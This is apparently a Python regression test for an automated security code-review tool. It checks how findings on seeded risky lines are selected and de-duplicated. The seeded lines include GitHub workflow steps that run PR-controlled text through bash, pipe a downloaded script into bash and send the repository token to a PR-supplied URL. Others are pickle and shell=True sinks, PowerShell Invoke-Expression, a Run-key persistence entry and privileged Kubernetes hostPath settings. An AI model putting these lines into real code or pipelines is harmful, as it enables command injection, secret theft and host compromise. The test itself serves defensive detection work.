#!/usr/bin/env python3
"""Regression self-test for DCOIR Review v14 runtime patch.

The test exercises the #339 failure shape: duplicate ACL coverage, Python
required-family starvation, validation text drifting from the final semantic
kind, archive extraction anchored to an import instead of the sink, and hostPath
over-counting at mountPath.
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import dcoir_review_required_runtime_patch_v13_selftest as v13test


WORKFLOW = ".github/workflows/dcoir-review-v14-family-render-probe.yml"
PYTHON = ".github/chatgpt_staging/dcoir_review_probe/v14_probe_python.py"
POWERSHELL = ".github/chatgpt_staging/dcoir_review_probe/v14_probe_powershell.ps1"
K8S = ".github/chatgpt_staging/dcoir_review_probe/v14_optional_k8s.yml"
TYPESCRIPT = ".github/chatgpt_staging/dcoir_review_probe/v14_optional_typescript.ts"


class Config(SimpleNamespace):
    max_inline_comments: int = 12
    debug: bool = True


class FakeHardened:
    ReviewQualityError = RuntimeError

    def __init__(self) -> None:
        self.debug: dict[str, object] = {}

    def write_debug_json_artifact_safely(self, _config: Any, path: str, data: Any) -> None:
        self.debug[path] = data


def _load_v14():
    v13test._load_v13()
    path = Path(__file__).with_name("dcoir_review_required_runtime_patch_v14.py")
    spec = importlib.util.spec_from_file_location("dcoir_review_required_runtime_patch_v14", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def sentinel(path: str, line: int, text: str, label: str = "", detail: str = "") -> SimpleNamespace:
    return SimpleNamespace(path=path, line=line, text=text, label=label, detail=detail)


def risk_sentinels() -> list[SimpleNamespace]:
    return [
        sentinel(WORKFLOW, 3, "  pull_request_target:"),
        sentinel(WORKFLOW, 5, "  contents: write"),
        sentinel(WORKFLOW, 6, "  actions: write"),
        sentinel(WORKFLOW, 13, "          ref: ${{ github.event.pull_request.head.sha }}"),
        sentinel(WORKFLOW, 15, '        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"'),
        sentinel(WORKFLOW, 17, '        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"'),
        sentinel(WORKFLOW, 19, "        run: curl -fsSL https://downloads.example.invalid/bootstrap.sh | bash"),
        sentinel(WORKFLOW, 21, '        run: sh -c "${{ github.event.pull_request.body }}"'),
        sentinel(PYTHON, 4, "import tarfile", "Python archive extraction context", "tar archive support"),
        sentinel(PYTHON, 12, "    return pickle.loads(raw)"),
        sentinel(PYTHON, 16, "    return yaml.load(text, Loader=yaml.Loader)"),
        sentinel(PYTHON, 20, "    return subprocess.check_output(command_text, shell=True)"),
        sentinel(PYTHON, 25, "    archive.extractall(destination)"),
        sentinel(PYTHON, 29, '    token = os.environ["DCOIR_TOKEN"]'),
        sentinel(PYTHON, 30, '    return requests.post(callback, headers={"Authorization": f"Bearer {token}"})'),
        sentinel(PYTHON, 34, '    Path(user_path).open(mode="w+b").write(payload.encode())'),
        sentinel(POWERSHELL, 10, '$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")'),
        sentinel(POWERSHELL, 11, "Set-Acl -Path $OutputPath -AclObject $acl"),
        sentinel(POWERSHELL, 13, "Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait"),
        sentinel(POWERSHELL, 15, "Invoke-Expression $UserCommand"),
        sentinel(POWERSHELL, 17, 'Invoke-WebRequest -Uri $Callback -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }'),
        sentinel(POWERSHELL, 19, 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Demo -Value $ToolPath'),
        sentinel(K8S, 6, "  hostPID: true"),
        sentinel(K8S, 11, "        privileged: true"),
        sentinel(K8S, 12, "        allowPrivilegeEscalation: true"),
        sentinel(K8S, 15, "          mountPath: /host"),
        sentinel(K8S, 18, "        hostPath:"),
        sentinel(TYPESCRIPT, 7, "target.innerHTML = profile.biography"),
        sentinel(TYPESCRIPT, 8, 'setTimeout("refresh()", 1000)'),
    ]


def mixed_findings() -> list[dict[str, Any]]:
    return [
        {
            "path": WORKFLOW,
            "line": 17,
            "title": "Workflow sends repository token to PR-controlled URL",
            "body": "This workflow sends the token to PR body URL.",
            "_anchored_line_text": '        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"',
            "_risk_sentinel_key": [WORKFLOW, 17, "yaml_token_to_pr_body_url"],
            "validation": "python3 -c \"from pathlib import Path; text=Path('x').read_text(); assert '| sh' not in text and '| bash' not in text\"",
            "severity": "critical",
            "confidence": 1,
        },
        {
            "path": POWERSHELL,
            "line": 10,
            "title": "PowerShell broad ACL grant exposes collector output",
            "_anchored_line_text": '$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")',
            "_risk_sentinel_key": [POWERSHELL, 10, "ps_acl"],
            "severity": "critical",
            "confidence": 0.99,
        },
        {
            "path": POWERSHELL,
            "line": 11,
            "title": "PowerShell broad ACL grant exposes collector output",
            "_anchored_line_text": "Set-Acl -Path $OutputPath -AclObject $acl",
            "_risk_sentinel_key": [POWERSHELL, 11, "ps_acl"],
            "severity": "critical",
            "confidence": 0.99,
        },
        {
            "path": PYTHON,
            "line": 12,
            "title": "Python deserializes untrusted pickle data",
            "_anchored_line_text": "    return pickle.loads(raw)",
            "_risk_sentinel_key": [PYTHON, 12, "python_pickle_load"],
            "body": "_Reviewed with openrouter/auto._",
            "severity": "critical",
            "confidence": 1,
        },
    ]


def test_required_family_balance_and_duplicate_coalescing() -> None:
    v14 = _load_v14()
    hardened = FakeHardened()
    selected = v14._select_required_postable(hardened, mixed_findings(), risk_sentinels(), Config())
    metadata = sys.modules["dcoir_review_required_runtime_patch_v9_core"].SELECTION_SUMMARY
    selected_keys = set(metadata["selected_keys"])
    selected_kind_lines = {(item.split(" ", 1)[0], item.split(" ", 1)[1]) for item in selected_keys}

    assert len(selected) == 12
    assert metadata["version"] == "v14"
    assert metadata["final_invalid_selected_keys"] == []
    assert metadata["posted_required_family_counts"]["python"] >= 1
    assert not (f"{POWERSHELL}:10", "ps_acl") in selected_kind_lines
    assert (f"{POWERSHELL}:11", "ps_acl") in selected_kind_lines
    assert sum(1 for key in selected_keys if key.endswith(" ps_acl")) == 1
    assert f"{WORKFLOW}:13 yaml_untrusted_checkout" in selected_keys
    assert f"{PYTHON}:25 python_archive_extract" in selected_keys
    assert f"{PYTHON}:34 python_path_write" in selected_keys

    omitted = {(item["path"], item["line"], item["kind"]) for item in metadata["omitted_required_sentinels"]}
    selected_tuples = {tuple(item["_risk_sentinel_key"]) for item in selected}
    assert (PYTHON, 4, "python_archive_extract") not in omitted
    assert (PYTHON, 4, "python_archive_extract") not in selected_tuples
    assert (PYTHON, 25, "python_archive_extract") in omitted or (PYTHON, 25, "python_archive_extract") in selected_tuples

    optional = {(item["path"], item["line"], item["kind"]) for item in metadata["omitted_optional_high_risk_sentinels"]}
    assert (K8S, 15, "k8s_host_path") not in optional
    assert (K8S, 18, "k8s_host_path") in optional or (K8S, 18, "k8s_host_path") in selected_tuples
